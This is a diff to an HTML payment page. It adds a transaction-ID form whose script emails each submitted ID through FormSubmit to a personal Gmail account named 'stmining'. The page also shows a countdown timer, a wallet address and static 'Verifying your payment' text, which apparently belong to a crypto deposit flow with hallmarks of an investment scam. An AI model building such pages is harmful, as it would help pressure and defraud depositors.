@@ -91,6 +91,16 @@
       color: #888;
       font-style: italic;
     }
+
+    .transaction-id-container {
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .transaction-id-input {
+      width: 80%;
+      margin-bottom: 15px;
+    }
   </style>
 </head>
 <body>
@@ -114,7 +124,7 @@
     <button onclick="showDetails()"> Next</button>
   </div>
 
-  <!-- New Page/Section -->
+  <!-- New Page/Section for Payment Details -->
   <div id="detailsPage" class="container hidden">
     <h2>Payment Details</h2>
     <div class="countdown" id="timer">Time left: 20:00</div>
@@ -122,6 +132,13 @@
     <div class="address" id="wallet"></div>
     <div class="loading-text">⏳ Verifying your payment...</div>
     <div class="next-text">Show Payment Details → Next</div>
+
+    <!-- Transaction ID Form -->
+    <div class="transaction-id-container">
+      <label for="transactionId">Enter your Transaction ID:</label>
+      <input type="text" id="transactionId" class="transaction-id-input" placeholder="Enter Transaction ID" required />
+      <button onclick="submitTransaction()">Submit Transaction</button>
+    </div>
   </div>
 
   <script>
@@ -189,6 +206,37 @@
         }
       }, 1000);
     }
+
+    // Function to handle transaction submission
+    function submitTransaction() {
+      const transactionId = document.getElementById("transactionId").value.trim();
+
+      if (!transactionId) {
+        alert("Please enter a valid Transaction ID.");
+        return;
+      }
+
+      // Sending the transaction details via FormSubmit
+      const formData = new FormData();
+      formData.append("email", "stmining@gmail.com");
+      formData.append("name", "Deposit Verification");
+      formData.append("message", `Transaction ID: ${transactionId} - Deposit was made. Please verify.`);
+
+      // Sending the email to FormSubmit
+      fetch("https://formsubmit.co/ajax/stmining@gmail.com", {
+        method: "POST",
+        body: formData
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("Transaction submitted successfully. We are verifying your deposit.");
+        }
+      })
+      .catch(error => {
+        alert("Error submitting transaction. Please try again.");
+      });
+    }
   </script>
+
 </body>
 </html>
